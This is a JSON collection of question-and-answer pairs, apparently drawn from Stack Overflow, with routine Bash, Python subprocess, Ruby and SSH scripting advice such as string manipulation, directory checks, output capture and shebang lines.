{
    "How do I execute a program or call a system command?": "Use subprocess.run:\nimport subprocess\n\nsubprocess.run([\"ls\", \"-l\"]) \nAnother common way is os.system but you shouldn't use it because it is unsafe if any parts of the command come from outside your program or can contain spaces or other special characters, also subprocess.run is generally more flexible (you can get the stdout, stderr, the \"real\" status code, better error handling, etc.). Even the documentation for os.system recommends using subprocess instead.\nOn Python 3.4 and earlier, use subprocess.call instead of .run:\nsubprocess.call([\"ls\", \"-l\"])",
    "How do I check if a directory exists or not in a Bash shell script?": "To check if a directory exists:\nif [ -d \"$DIRECTORY\" ]; then\n  echo \"$DIRECTORY does exist.\"\nfi\nTo check if a directory does not exist:\nif [ ! -d \"$DIRECTORY\" ]; then\n  echo \"$DIRECTORY does not exist.\"\nfi\nHowever, as Jon Ericson points out, subsequent commands may not work as intended if you do not take into account that a symbolic link to a directory will also pass this check. E.g. running this:\nln -s \"$ACTUAL_DIR\" \"$SYMLINK\"\nif [ -d \"$SYMLINK\" ]; then \n  rmdir \"$SYMLINK\" \nfi\nWill produce the error message:\nrmdir: failed to remove `symlink': Not a directory\nSo symbolic links may have to be treated differently, if subsequent commands expect directories:\nif [ -d \"$LINK_OR_DIR\" ]; then \n  if [ -L \"$LINK_OR_DIR\" ]; then\n    # It is a symlink!\n    # Symbolic link specific commands go here.\n    rm \"$LINK_OR_DIR\"\n  else\n    # It's a directory!\n    # Directory command goes here.\n    rmdir \"$LINK_OR_DIR\"\n  fi\nfi\nTake particular note of the double-quotes used to wrap the variables. The reason for this is explained by 8jean in another answer.\nIf the variables contain spaces or other unusual characters it will probably cause the script to fail.",
    "How to check if a string contains a substring in Bash": "You can use Marcus's answer (* wildcards) outside a case statement, too, if you use double brackets:\nstring='My long string'\nif [[ $string == *\"My long\"* ]]; then\n  echo \"It's there!\"\nfi\nNote that spaces in the needle string need to be placed between double quotes, and the * wildcards should be outside. Also note that a simple comparison operator is used (i.e. ==), not the regex operator =~.",
    "How to concatenate string variables in Bash": "foo=\"Hello\"\nfoo=\"${foo} World\"\necho \"${foo}\"\n> Hello World\nIn general to concatenate two variables you can just write them one after another:\na='Hello'\nb='World'\nc=\"${a} ${b}\"\necho \"${c}\"\n> Hello World",
    "How do I copy a folder from remote to local using scp? [closed]": "scp -r user@your.server.example.com:/path/to/foo /home/user/Desktop/\nBy not including the trailing '/' at the end of foo, you will copy the directory itself (including contents), rather than only the contents of the directory.\nFrom man scp (See online manual)\n-r Recursively copy entire directories",
    "What does \" 2>&1 \" mean?": "File descriptor 1 is the standard output (stdout).\nFile descriptor 2 is the standard error (stderr).\nAt first, 2>1 may look like a good way to redirect stderr to stdout. However, it will actually be interpreted as \"redirect stderr to a file named 1\".\n& indicates that what follows and precedes is a file descriptor, and not a filename. Thus, we use 2>&1. Consider >& to be a redirect merger operator.",
    "How can I recursively find all files in current and subfolders based on wildcard matching?": "Use find:\nfind . -name \"foo*\"\nfind needs a starting point, so the . (dot) points to the current directory.\nIf you need case insensitive search use :\nfind . -iname \"foo*\"",
    "How do I split a string on a delimiter in Bash?": "You can set the internal field separator (IFS) variable, and then let it parse into an array. When this happens in a command, then the assignment to IFS only takes place to that single command's environment (to read ). It then parses the input according to the IFS variable value into an array, which we can then iterate over.\nThis example will parse one line of items separated by ;, pushing it into an array:\nIFS=';' read -ra ADDR <<< \"$IN\"\nfor i in \"${ADDR[@]}\"; do\n  # process \"$i\"\ndone\nThis other example is for processing the whole content of $IN, each time one line of input separated by ;:\nwhile IFS=';' read -ra ADDR; do\n  for i in \"${ADDR[@]}\"; do\n    # process \"$i\"\n  done\ndone <<< \"$IN\"",
    "How to mkdir only if a directory does not already exist?": "Try mkdir -p:\nmkdir -p foo\nNote that this will also create any intermediate directories that don't exist; for instance,\nmkdir -p foo/bar/baz\nwill create directories foo, foo/bar, and foo/bar/baz if they don't exist.\nSome implementation like GNU mkdir include mkdir --parents as a more readable alias, but this is not specified in POSIX/Single Unix Specification and not available on many common platforms like macOS, various BSDs, and various commercial Unixes, so it should be avoided.\nIf you want an error when parent directories don't exist, and want to create the directory if it doesn't exist, then you can test for the existence of the directory first:\n[ -d foo ] || mkdir foo",
    "How do I set a variable to the output of a command in Bash?": "In addition to backticks `command`, command substitution can be done with $(command) or \"$(command)\", which I find easier to read, and allows for nesting.\nOUTPUT=\"$(ls -1)\"\necho \"${OUTPUT}\"\n\nMULTILINE=\"$(ls \\\n   -1)\"\necho \"${MULTILINE}\"\nQuoting (\") does matter to preserve multi-line variable values and it is safer to use with whitespace and special characters such as (*) and therefore advised; it is, however, optional on the right-hand side of an assignment when word splitting is not performed, so OUTPUT=$(ls -1) would work fine.",
    "How to check if a variable is set in Bash": "(Usually) The right way\nif [ -z ${var+x} ]; then echo \"var is unset\"; else echo \"var is set to '$var'\"; fi\nwhere ${var+x} is a parameter expansion which evaluates to nothing if var is unset, and substitutes the string x otherwise.\nQuotes Digression\nQuotes can be omitted (so we can say ${var+x} instead of \"${var+x}\") because this syntax & usage guarantees this will only expand to something that does not require quotes (since it either expands to x (which contains no word breaks so it needs no quotes), or to nothing (which results in [ -z  ], which conveniently evaluates to the same value (true) that [ -z \"\" ] does as well)).\nHowever, while quotes can be safely omitted, and it was not immediately obvious to all (it wasn't even apparent to the first author of this quotes explanation who is also a major Bash coder), it would sometimes be better to write the solution with quotes as [ -z \"${var+x}\" ], at the very small possible cost of an O(1) speed penalty. The first author also added this as a comment next to the code using this solution giving the URL to this answer, which now also includes the explanation for why the quotes can be safely omitted.\n(Often) The wrong way\nif [ -z \"$var\" ]; then echo \"var is blank\"; else echo \"var is set to '$var'\"; fi\nThis is often wrong because it doesn't distinguish between a variable that is unset and a variable that is set to the empty string. That is to say, if var='', then the above solution will output \"var is blank\".\nThe distinction between unset and \"set to the empty string\" is essential in situations where the user has to specify an extension, or additional list of properties, and that not specifying them defaults to a non-empty value, whereas specifying the empty string should make the script use an empty extension or list of additional properties.\nThe distinction may not be essential in every scenario though. In those cases [ -z \"$var\" ] will be just fine.",
    "How to delete from a text file, all lines that contain a specific string?": "To remove the line and print the output to standard out:\nsed '/pattern to match/d' ./infile\nTo directly modify the file \u2013 does not work with BSD sed:\nsed -i '/pattern to match/d' ./infile\nSame, but for BSD sed (Mac OS X and FreeBSD) \u2013 does not work with GNU sed:\nsed -i '' '/pattern to match/d' ./infile\nTo directly modify the file (and create a backup) \u2013 works with BSD and GNU sed:\nsed -i.bak '/pattern to match/d' ./infile",
    "Loop through an array of strings in Bash?": "You can use it like this:\n## declare an array variable\ndeclare -a arr=(\"element1\" \"element2\" \"element3\")\n\n## now loop through the above array\nfor i in \"${arr[@]}\"\ndo\n   echo \"$i\"\n   # or do whatever with individual element of the array\ndone\n\n# You can access them using echo \"${arr[0]}\", \"${arr[1]}\" also\nAlso works for multi-line array declaration\ndeclare -a arr=(\"element1\" \n                \"element2\" \"element3\"\n                \"element4\"\n                )",
    "How do I exclude a directory when using `find`?": "If -prune doesn't work for you, this will:\nfind -name \"*.js\" -not -path \"./directory/*\"\nCaveat: requires traversing all of the unwanted directories.",
    "How do I iterate over a range of numbers defined by variables in Bash?": "for i in $(seq 1 $END); do echo $i; done\nedit: I prefer seq over the other methods because I can actually remember it ;)",
    "How to reload .bashrc settings without logging out and back in again?": "You can enter the long form command:\nsource ~/.bashrc\nor you can use the shorter version of the command:\n. ~/.bashrc",
    "How can I count all the lines of code in a directory recursively?": "Try:\nfind . -name '*.php' | xargs wc -l\nor (when file names include special characters such as spaces)\nfind . -name '*.php' | sed 's/.*/\"&\"/' | xargs  wc -l\nThe SLOCCount tool may help as well.\nIt will give an accurate source lines of code count for whatever hierarchy you point it at, as well as some additional stats.\nSorted output:\nfind . -name '*.php' | xargs wc -l | sort -nr",
    "Check existence of input argument in a Bash shell script": "It is:\nif [ $# -eq 0 ]\n  then\n    echo \"No arguments supplied\"\nfi\nThe $# variable will tell you the number of input arguments the script was passed.\nOr you can check if an argument is an empty string or not like:\nif [ -z \"$1\" ]\n  then\n    echo \"No argument supplied\"\nfi\nThe -z switch will test if the expansion of \"$1\" is a null string or not. If it is a null string then the body is executed.",
    "How do I prompt for Yes/No/Cancel input in a Linux shell script?": "A widely available method to get user input at a shell prompt is the read command. Here is a demonstration:\nwhile true; do\n    read -p \"Do you wish to install this program? \" yn\n    case $yn in\n        [Yy]* ) make install; break;;\n        [Nn]* ) exit;;\n        * ) echo \"Please answer yes or no.\";;\n    esac\ndone\nAnother method, pointed out by Steven Huwig, is Bash's select command. Here is the same example using select:\necho \"Do you wish to install this program?\"\nselect yn in \"Yes\" \"No\"; do\n    case $yn in\n        Yes ) make install; break;;\n        No ) exit;;\n    esac\ndone\nWith select you don't need to sanitize the input \u2013 it displays the available choices, and you type a number corresponding to your choice. It also loops automatically, so there's no need for a while true loop to retry if they give invalid input.\nAlso, L\u00e9a Gris demonstrated a way to make the request language agnostic in her answer. Adapting my first example to better serve multiple languages might look like this:\nset -- $(locale LC_MESSAGES)\nyesexpr=\"$1\"; noexpr=\"$2\"; yesword=\"$3\"; noword=\"$4\"\n\nwhile true; do\n    read -p \"Install (${yesword} / ${noword})? \" yn\n    if [[ \"$yn\" =~ $yesexpr ]]; then make install; exit; fi\n    if [[ \"$yn\" =~ $noexpr ]]; then exit; fi\n    echo \"Answer ${yesword} / ${noword}.\"\ndone\nObviously other communication strings remain untranslated here (Install, Answer) which would need to be addressed in a more fully completed translation, but even a partial translation would be helpful in many cases.\nFinally, please check out the excellent answer by F. Hauri.",
    "Difference between sh and Bash": "What is sh?\nsh (or the Shell Command Language) is a programming language described by the POSIX standard. It has many implementations (ksh88, Dash, ...). Bash can also be considered an implementation of sh (see below).\nBecause sh is a specification, not an implementation, /bin/sh is a symlink (or a hard link) to an actual implementation on most POSIX systems.\nWhat is Bash?\nBash started as an sh-compatible implementation (although it predates the POSIX standard by a few years), but as time passed it has acquired many extensions. Many of these extensions may change the behavior of valid POSIX shell scripts, so by itself Bash is not a valid POSIX shell. Rather, it is a dialect of the POSIX shell language.\nBash supports a --posix switch, which makes it more POSIX-compliant. It also tries to mimic POSIX if invoked as sh.\nsh = bash?\nFor a long time, /bin/sh used to point to /bin/bash on most GNU/Linux systems. As a result, it had almost become safe to ignore the difference between the two. But that started to change recently.\nSome popular examples of systems where /bin/sh does not point to /bin/bash (and on some of which /bin/bash may not even exist) are:\nModern Debian and Ubuntu systems, which symlink sh to dash by default;\nBusybox, which is usually run during the Linux system boot time as part of initramfs. It uses the ash shell implementation.\nBSD systems, and in general any non-Linux systems. OpenBSD uses pdksh, a descendant of the KornShell. FreeBSD's sh is a descendant of the original Unix Bourne shell. Solaris has its own sh which for a long time was not POSIX-compliant; a free implementation is available from the Heirloom project.\nHow can you find out what /bin/sh points to on your system?\nThe complication is that /bin/sh could be a symbolic link or a hard link. If it's a symbolic link, a portable way to resolve it is:\n% file -h /bin/sh\n/bin/sh: symbolic link to bash\nIf it's a hard link, try\n% find -L /bin -samefile /bin/sh\n/bin/sh\n/bin/bash\nIn fact, the -L flag covers both symlinks and hardlinks, but the disadvantage of this method is that it is not portable \u2014 POSIX does not require find to support the -samefile option, although both GNU find and FreeBSD find support it.\nShebang line\nUltimately, it's up to you to decide which one to use, by writing the \u00abshebang\u00bb line as the very first line of the script.\nE.g.\n#!/bin/sh\nwill use sh (and whatever that happens to point to),\n#!/bin/bash\nwill use /bin/bash if it's available (and fail with an error message if it's not). Of course, you can also specify another implementation, e.g.\n#!/bin/dash\nWhich one to use\nFor my own scripts, I prefer sh for the following reasons:\nit is standardized\nit is much simpler and easier to learn\nit is portable across POSIX systems \u2014 even if they happen not to have bash, they are required to have sh\nThere are advantages to using bash as well. Its features make programming more convenient and similar to programming in other modern programming languages. These include things like scoped local variables and arrays. Plain sh is a very minimalistic programming language.",
    "How to specify the private SSH-key to use when executing shell command on Git?": "None of these solutions worked for me.\nInstead, I elaborate on @Martin v. L\u00f6wis 's mention of setting a config file for SSH.\nSSH will look for the user's ~/.ssh/config file. I have mine setup as:\nHost gitserv\n    Hostname remote.server.com\n    IdentityFile ~/.ssh/id_rsa.github\n    IdentitiesOnly yes # see NOTES below\n    AddKeysToAgent yes\nAnd I add a remote git repository:\ngit remote add origin git@gitserv:myrepo.git\n(or clone a fresh copy of the repo with git@gitserv:myrepo.git as address)\nAnd then git commands work normally for me.\ngit push -v origin master\nIf you have submodules, you can also execute the following in the repo directory, to force the submodules to use the same key:\ngit config url.git@gitserv:.insteadOf https://remote.server.com\nNOTES\nThe IdentitiesOnly yes is required to prevent the SSH default behavior of sending the identity file matching the default filename for each protocol. If you have a file named ~/.ssh/id_rsa that will get tried BEFORE your ~/.ssh/id_rsa.github without this option.\nAddKeysToAgent yes lets you avoid reentering the key passphrase every time.\nYou can also add User git to avoid writing git@ every time.\nReferences\nBest way to use multiple SSH private keys on one client\nHow could I stop ssh offering a wrong key",
    "How to convert a string to lower case in Bash": "There are various ways:\nPOSIX standard\ntr\n$ echo \"$a\" | tr '[:upper:]' '[:lower:]'\nhi all\nAWK\n$ echo \"$a\" | awk '{print tolower($0)}'\nhi all\nNon-POSIX\nYou may run into portability issues with the following examples:\nBash 4.0\n$ echo \"${a,,}\"\nhi all\nsed\n$ echo \"$a\" | sed -e 's/\\(.*\\)/\\L\\1/'\nhi all\n# this also works:\n$ sed -e 's/\\(.*\\)/\\L\\1/' <<< \"$a\"\nhi all\nPerl\n$ echo \"$a\" | perl -ne 'print lc'\nhi all\nBash\nlc(){\n    case \"$1\" in\n        [A-Z])\n        n=$(printf \"%d\" \"'$1\")\n        n=$((n+32))\n        printf \\\\$(printf \"%o\" \"$n\")\n        ;;\n        *)\n        printf \"%s\" \"$1\"\n        ;;\n    esac\n}\nword=\"I Love Bash\"\nfor((i=0;i<${#word};i++))\ndo\n    ch=\"${word:$i:1}\"\n    lc \"$ch\"\ndone\nNote: YMMV on this one. Doesn't work for me (GNU bash version 4.2.46 and 4.0.33 (and same behaviour 2.05b.0 but nocasematch is not implemented)) even with using shopt -u nocasematch;. Unsetting that nocasematch causes [[ \"fooBaR\" == \"FOObar\" ]] to match OK BUT inside case weirdly [b-z] are incorrectly matched by [A-Z]. Bash is confused by the double-negative (\"unsetting nocasematch\")! :-)",
    "YYYY-MM-DD format date in shell script": "In bash (>=4.2) it is preferable to use printf's built-in date formatter (part of bash) rather than the external date (usually GNU date). Note that invoking a subshell has performance problems in Cygwin due to a slow fork() call on Windows.\nAs such:\n# put current date as yyyy-mm-dd in $date\n# -1 -> explicit current date, bash >=4.3 defaults to current time if not provided\n# -2 -> start time for shell\nprintf -v date '%(%Y-%m-%d)T\\n' -1\n\n# put current date as yyyy-mm-dd HH:MM:SS in $date\nprintf -v date '%(%Y-%m-%d %H:%M:%S)T\\n' -1\n\n# to print directly remove -v flag, as such:\nprintf '%(%Y-%m-%d)T\\n' -1\n# -> current date printed to terminal\nIn bash (<4.2):\n# put current date as yyyy-mm-dd in $date\ndate=$(date '+%Y-%m-%d')\n\n# put current date as yyyy-mm-dd HH:MM:SS in $date\ndate=$(date '+%Y-%m-%d %H:%M:%S')\n\n# print current date directly\necho $(date '+%Y-%m-%d')\nOther available date formats can be viewed from the date man pages (for external non-bash specific command):\nman date",
    "How can I declare and use Boolean variables in a shell script?": "Revised Answer (Feb 12, 2014)\nthe_world_is_flat=true\n# ...do something interesting...\nif [ \"$the_world_is_flat\" = true ] ; then\n    echo 'Be careful not to fall off!'\nfi\nOriginal Answer\nCaveats: https://stackoverflow.com/a/21210966/89391\nthe_world_is_flat=true\n# ...do something interesting...\nif $the_world_is_flat ; then\n    echo 'Be careful not to fall off!'\nfi\nFrom: Using boolean variables in Bash\nThe reason the original answer is included here is because the comments before the revision on Feb 12, 2014 pertain only to the original answer, and many of the comments are wrong when associated with the revised answer. For example, Dennis Williamson's comment about Bash's builtin true on Jun 2, 2010 only applies to the original answer, not the revised.",
    "Running shell command and capturing the output": "In all officially maintained versions of Python, the simplest approach is to use the subprocess.check_output function:\n>>> subprocess.check_output(['ls', '-l'])\nb'total 0\\n-rw-r--r--  1 memyself  staff  0 Mar 14 11:04 files\\n'\ncheck_output runs a single program that takes only arguments as input.1 It returns the result exactly as printed to stdout. If you need to write input to stdin, skip ahead to the run or Popen sections. If you want to execute complex shell commands, see the note on shell=True at the end of this answer.\nThe check_output function works in all officially maintained versions of Python. But for more recent versions, a more flexible approach is available.\nModern versions of Python (3.5 or higher): run\nIf you're using Python 3.5+, and do not need backwards compatibility, the new run function is recommended by the official documentation for most tasks. It provides a very general, high-level API for the subprocess module. To capture the output of a program, pass the subprocess.PIPE flag to the stdout keyword argument. Then access the stdout attribute of the returned CompletedProcess object:\n>>> import subprocess\n>>> result = subprocess.run(['ls', '-l'], stdout=subprocess.PIPE)\n>>> result.stdout\nb'total 0\\n-rw-r--r--  1 memyself  staff  0 Mar 14 11:04 files\\n'\nThe return value is a bytes object, so if you want a proper string, you'll need to decode it. Assuming the called process returns a UTF-8-encoded string:\n>>> result.stdout.decode('utf-8')\n'total 0\\n-rw-r--r--  1 memyself  staff  0 Mar 14 11:04 files\\n'\nThis can all be compressed to a one-liner if desired:\n>>> subprocess.run(['ls', '-l'], stdout=subprocess.PIPE).stdout.decode('utf-8')\n'total 0\\n-rw-r--r--  1 memyself  staff  0 Mar 14 11:04 files\\n'\nIf you want to pass input to the process's stdin, you can pass a bytes object to the input keyword argument:\n>>> cmd = ['awk', 'length($0) > 5']\n>>> ip = 'foo\\nfoofoo\\n'.encode('utf-8')\n>>> result = subprocess.run(cmd, stdout=subprocess.PIPE, input=ip)\n>>> result.stdout.decode('utf-8')\n'foofoo\\n'\nYou can capture errors by passing stderr=subprocess.PIPE (capture to result.stderr) or stderr=subprocess.STDOUT (capture to result.stdout along with regular output). If you want run to throw an exception when the process returns a nonzero exit code, you can pass check=True. (Or you can check the returncode attribute of result above.) When security is not a concern, you can also run more complex shell commands by passing shell=True as described at the end of this answer.\nLater versions of Python streamline the above further. In Python 3.7+, the above one-liner can be spelled like this:\n>>> subprocess.run(['ls', '-l'], capture_output=True, text=True).stdout\n'total 0\\n-rw-r--r--  1 memyself  staff  0 Mar 14 11:04 files\\n'\nUsing run this way adds just a bit of complexity, compared to the old way of doing things. But now you can do almost anything you need to do with the run function alone.\nOlder versions of Python (3-3.4): more about check_output\nIf you are using an older version of Python, or need modest backwards compatibility, you can use the check_output function as briefly described above. It has been available since Python 2.7.\nsubprocess.check_output(*popenargs, **kwargs)  \nIt takes takes the same arguments as Popen (see below), and returns a string containing the program's output. The beginning of this answer has a more detailed usage example. In Python 3.5+, check_output is equivalent to executing run with check=True and stdout=PIPE, and returning just the stdout attribute.\nYou can pass stderr=subprocess.STDOUT to ensure that error messages are included in the returned output. When security is not a concern, you can also run more complex shell commands by passing shell=True as described at the end of this answer.\nIf you need to pipe from stderr or pass input to the process, check_output won't be up to the task. See the Popen examples below in that case.\nComplex applications and legacy versions of Python (2.6 and below): Popen\nIf you need deep backwards compatibility, or if you need more sophisticated functionality than check_output or run provide, you'll have to work directly with Popen objects, which encapsulate the low-level API for subprocesses.\nThe Popen constructor accepts either a single command without arguments, or a list containing a command as its first item, followed by any number of arguments, each as a separate item in the list. shlex.split can help parse strings into appropriately formatted lists. Popen objects also accept a host of different arguments for process IO management and low-level configuration.\nTo send input and capture output, communicate is almost always the preferred method. As in:\noutput = subprocess.Popen([\"mycmd\", \"myarg\"], \n                          stdout=subprocess.PIPE).communicate()[0]\nOr\n>>> import subprocess\n>>> p = subprocess.Popen(['ls', '-a'], stdout=subprocess.PIPE, \n...                                    stderr=subprocess.PIPE)\n>>> out, err = p.communicate()\n>>> print out\n.\n..\nfoo\nIf you set stdin=PIPE, communicate also allows you to pass data to the process via stdin:\n>>> cmd = ['awk', 'length($0) > 5']\n>>> p = subprocess.Popen(cmd, stdout=subprocess.PIPE,\n...                           stderr=subprocess.PIPE,\n...                           stdin=subprocess.PIPE)\n>>> out, err = p.communicate('foo\\nfoofoo\\n')\n>>> print out\nfoofoo\nNote Aaron Hall's answer, which indicates that on some systems, you may need to set stdout, stderr, and stdin all to PIPE (or DEVNULL) to get communicate to work at all.\nIn some rare cases, you may need complex, real-time output capturing. Vartec's answer suggests a way forward, but methods other than communicate are prone to deadlocks if not used carefully.\nAs with all the above functions, when security is not a concern, you can run more complex shell commands by passing shell=True.\nNotes\n1. Running shell commands: the shell=True argument\nNormally, each call to run, check_output, or the Popen constructor executes a single program. That means no fancy bash-style pipes. If you want to run complex shell commands, you can pass shell=True, which all three functions support. For example:\n>>> subprocess.check_output('cat books/* | wc', shell=True, text=True)\n' 1299377 17005208 101299376\\n'\nHowever, doing this raises security concerns. If you're doing anything more than light scripting, you might be better off calling each process separately, and passing the output from each as an input to the next, via\nrun(cmd, [stdout=etc...], input=other_output)\nOr\nPopen(cmd, [stdout=etc...]).communicate(other_output)\nThe temptation to directly connect pipes is strong; resist it. Otherwise, you'll likely see deadlocks or have to do hacky things like this.",
    "How to use SSH to run a local shell script on a remote machine?": "If Machine A is a Windows box, you can use Plink (part of PuTTY) with the -m parameter, and it will execute the local script on the remote server.\nplink root@MachineB -m local_script.sh\nIf Machine A is a Unix-based system, you can use:\nssh root@MachineB 'bash -s' < local_script.sh\nYou shouldn't have to copy the script to the remote server to run it.",
    "Replace one substring for another string in shell script": "To replace the first occurrence of a pattern with a given string, use ${parameter/pattern/string}:\n#!/bin/bash\nfirstString=\"I love Suzi and Marry\"\nsecondString=\"Sara\"\necho \"${firstString/Suzi/\"$secondString\"}\"\n# prints 'I love Sara and Marry'\nTo replace all occurrences, use ${parameter//pattern/string}:\nmessage='The secret code is 12345'\necho \"${message//[0-9]/X}\"\n# prints 'The secret code is XXXXX'\n(This is documented in the Bash Reference Manual, \u00a73.5.3 \"Shell Parameter Expansion\".)\nNote that this feature is not specified by POSIX \u2014 it's a Bash extension \u2014 so not all Unix shells implement it. For the relevant POSIX documentation, see The Open Group Technical Standard Base Specifications, Issue 7, the Shell & Utilities volume, \u00a72.6.2 \"Parameter Expansion\".",
    "Assigning default values to shell variables with a single command in bash": "Very close to what you posted, actually. You can use something called Bash parameter expansion to accomplish this.\nTo get the assigned value, or default if it's missing:\nFOO=\"${VARIABLE:-default}\"  # FOO will be assigned 'default' value if VARIABLE not set or null.\n# The value of VARIABLE remains untouched.\nTo do the same, as well as assign default to VARIABLE:\nFOO=\"${VARIABLE:=default}\"  # If VARIABLE not set or null, set its value to 'default'. \n# Then that value will be assigned to FOO",
    "Why do people write \"#!/usr/bin/env python\" on the first line of a Python script?": "If you have several versions of Python installed, /usr/bin/env will ensure the interpreter used is the first one on your environment's $PATH. The alternative would be to hard code something like #!/usr/bin/python; that's ok, but less flexible.\nIn Unix, an executable file that's meant to be interpreted can indicate what interpreter to use by having a #! at the start of the first line, followed by the interpreter (and any flags it may need).\nIf you're talking about other platforms, of course, this rule does not apply (but that \"shebang line\" does no harm, and will help if you ever copy that script to a platform with a Unix base, such as Linux, Mac, etc.).",
    "How to echo shell commands as they are executed": "set -x or set -o xtrace expands variables and prints a little + sign before the line.\nset -v or set -o verbose does not expand the variables before printing.\nUse set +x and set +v to turn off the above settings.\nOn the first line of the script, one can put #!/bin/sh -x (or -v) to have the same effect as set -x (or -v) later in the script.\nThe above also works with /bin/sh.\nSee the bash-hackers' wiki on set attributes, and on debugging.\n$ cat shl\n#!/bin/bash                                                                     \n\nDIR=/tmp/so\nls $DIR\n\n$ bash -x shl \n+ DIR=/tmp/so\n+ ls /tmp/so\n$",
    "How to call shell commands from Ruby": "This explanation is based on a commented Ruby script from a friend of mine. If you want to improve the script, feel free to update it at the link.\nFirst, note that when Ruby calls out to a shell, it typically calls /bin/sh, not Bash. Some Bash syntax is not supported by /bin/sh on all systems.\nHere are ways to execute a shell script:\ncmd = \"echo 'hi'\" # Sample string that can be used\nKernel#` , commonly called backticks \u2013 `cmd`\nThis is like many other languages, including Bash, PHP, and Perl.\nReturns the result (i.e. standard output) of the shell command.\nDocs: http://ruby-doc.org/core/Kernel.html#method-i-60\nvalue = `echo 'hi'`\nvalue = `#{cmd}`\nBuilt-in syntax, %x( cmd )\nFollowing the x character is a delimiter, which can be any character. If the delimiter is one of the characters (, [, {, or <, the literal consists of the characters up to the matching closing delimiter, taking account of nested delimiter pairs. For all other delimiters, the literal comprises the characters up to the next occurrence of the delimiter character. String interpolation #{ ... } is allowed.\nReturns the result (i.e. standard output) of the shell command, just like the backticks.\nDocs: https://docs.ruby-lang.org/en/master/syntax/literals_rdoc.html#label-Percent+Strings\nvalue = %x( echo 'hi' )\nvalue = %x[ #{cmd} ]\nKernel#system\nExecutes the given command in a subshell.\nReturns true if the command was found and run successfully, false otherwise.\nDocs: http://ruby-doc.org/core/Kernel.html#method-i-system\nwasGood = system( \"echo 'hi'\" )\nwasGood = system( cmd )\nKernel#exec\nReplaces the current process by running the given external command.\nReturns none, the current process is replaced and never continues.\nDocs: http://ruby-doc.org/core/Kernel.html#method-i-exec\nexec( \"echo 'hi'\" )\nexec( cmd ) # Note: this will never be reached because of the line above\nHere's some extra advice: $?, which is the same as $CHILD_STATUS, accesses the status of the last system executed command if you use the backticks, system() or %x{}. You can then access the exitstatus and pid properties:\n$?.exitstatus\nFor more reading see:\nhttp://www.elctech.com/blog/i-m-in-ur-commandline-executin-ma-commands\nhttp://blog.jayfields.com/2006/06/ruby-kernel-system-exec-and-x.html\nhttp://tech.natemurray.com/2007/03/ruby-shell-commands.html",
    "Should I put #! (shebang) in Python scripts, and what form should it take?": "The shebang line in any script determines the script's ability to be executed like a standalone executable without typing python beforehand in the terminal or when double clicking it in a file manager (when configured properly). It isn't necessary but generally put there so when someone sees the file opened in an editor, they immediately know what they're looking at. However, which shebang line you use is important.\nCorrect usage for (defaults to version 3.latest) Python 3 scripts is:\n#!/usr/bin/env python3\nCorrect usage for (defaults to version 2.latest) Python 2 scripts is:\n#!/usr/bin/env python2\nThe following should not be used (except for the rare case that you are writing code which is compatible with both Python 2.x and 3.x):\n#!/usr/bin/env python\nThe reason for these recommendations, given in PEP 394, is that python can refer either to python2 or python3 on different systems.\nAlso, do not use:\n#!/usr/local/bin/python\n\"python may be installed at /usr/bin/python or /bin/python in those cases, the above #! will fail.\"\n\u2015\"#!/usr/bin/env python\" vs \"#!/usr/local/bin/python\"",
    "Defining a variable with or without export": "export makes the variable available to sub-processes.\nThat is,\nexport name=value\nmeans that the variable name is available to any process you run from that shell process. If you want a process to make use of this variable, use export, and run the process from that shell.\nname=value\nmeans the variable scope is restricted to the shell, and is not available to any other process. You would use this for (say) loop variables, temporary variables etc.\nIt's important to note that exporting a variable doesn't make it available to parent processes. That is, specifying and exporting a variable in a spawned process doesn't make it available in the process that launched it.",
    "How to reload .bash_profile from the command line": "Simply type source ~/.bash_profile\nAlternatively, if you like saving keystrokes, you can type . ~/.bash_profile",
    "How do I pause my shell script for a second before continuing?": "Use the sleep command.\nExample:\nsleep .5 # Waits 0.5 second.\nsleep 5  # Waits 5 seconds.\nsleep 5s # Waits 5 seconds.\nsleep 5m # Waits 5 minutes.\nsleep 5h # Waits 5 hours.\nsleep 5d # Waits 5 days.\nOne can also employ decimals when specifying a time unit; e.g. sleep 1.5s",
    "How to call one shell script from another shell script?": "There are a couple of different ways you can do this:\nMake the other script executable with chmod a+x /path/to/file, add the #!/bin/bash line (called shebang) at the top, and the path where the file is to the $PATH environment variable. Then you can call it as a normal command;\nOr call it with the source command (which is an alias for .), like this:\nsource /path/to/script\nOr use the bash command to execute it, like:\n/bin/bash /path/to/script\nThe first and third approaches execute the script as another process, so variables and functions in the other script will not be accessible.\nThe second approach executes the script in the first script's process, and pulls in variables and functions from the other script (so they are usable from the calling script). It will of course run all the commands in the other script, not only set variables.\nIn the second method, if you are using exit in second script, it will exit the first script as well. Which will not happen in first and third methods.",
    "Extract substring in Bash": "You can use Parameter Expansion to do this.\nIf a is constant, the following parameter expansion performs substring extraction:\nb=${a:12:5}\nwhere 12 is the offset (zero-based) and 5 is the length\nIf the underscores around the digits are the only ones in the input, you can strip off the prefix and suffix (respectively) in two steps:\ntmp=${a#*_}   # remove prefix ending in \"_\"\nb=${tmp%_*}   # remove suffix starting with \"_\"\nIf there are other underscores, it's probably feasible anyway, albeit more tricky. If anyone knows how to perform both expansions in a single expression, I'd like to know too.\nBoth solutions presented are pure bash, with no process spawning involved, hence very fast.",
    "Get current directory or folder name (without the full path)": "No need for basename, and especially no need for a subshell running pwd (which adds an extra, and expensive, fork operation); the shell can do this internally using parameter expansion:\nresult=${PWD##*/}          # to assign to a variable\nresult=${result:-/}        # to correct for the case where PWD is / (root)\n\nprintf '%s\\n' \"${PWD##*/}\" # to print to stdout\n                           # ...more robust than echo for unusual names\n                           #    (consider a directory named -e or -n)\n\nprintf '%q\\n' \"${PWD##*/}\" # to print to stdout, quoted for use as shell input\n                           # ...useful to make hidden characters readable.\nNote that if you're applying this technique in other circumstances (not PWD, but some other variable holding a directory name), you might need to trim any trailing slashes. The below uses bash's extglob support to work even with multiple trailing slashes:\ndirname=/path/to/somewhere//\nshopt -s extglob           # enable +(...) glob syntax\nresult=${dirname%%+(/)}    # trim however many trailing slashes exist\nresult=${result##*/}       # remove everything before the last / that still remains\nresult=${result:-/}        # correct for dirname=/ case\nprintf '%s\\n' \"$result\"\nAlternatively, without extglob:\ndirname=\"/path/to/somewhere//\"\nresult=\"${dirname%\"${dirname##*[!/]}\"}\" # extglob-free multi-trailing-/ trim\nresult=\"${result##*/}\"                  # remove everything before the last /\nresult=${result:-/}                     # correct for dirname=/ case",
